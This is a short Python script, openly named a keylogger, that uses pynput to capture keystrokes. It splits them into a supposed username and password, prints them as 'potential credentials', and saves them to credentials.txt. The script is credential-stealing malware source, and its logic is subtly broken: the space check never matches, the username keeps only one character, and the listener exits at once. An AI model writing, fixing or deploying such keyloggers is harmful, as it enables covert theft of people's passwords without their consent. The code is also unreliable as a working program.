from pynput import keyboard as kb
import hashlib

class Keylogger:
    def __init__(self):
        self.password = ""
        self.username = ""

    def record(self, key):
        if str(key) == 'Space': 
            return None
        elif key == kb.Key.enter: 
            if self.username and self.password:
                print('Potential credentials:', self.username, self.password)
                hashed_pass = hashlib.sha256(self.password.encode()).hexdigest()
                with open('credentials.txt', 'a') as f:
                    f.write(self.username + ':' + hashed_pass + '\n')
            self.password=""
        elif key == kb.Key.backspace: 
            self.password = self.password[:-1]
        else:
            if not self.username:
                self.username += str(key)
            else:
                self.password += str(key)

def main():
    try:
        with kb.Listener(on_press=Keylogger().record): 
            pass
    except KeyboardInterrupt:
        print('\nExiting')

if __name__ == "__main__":
    main()
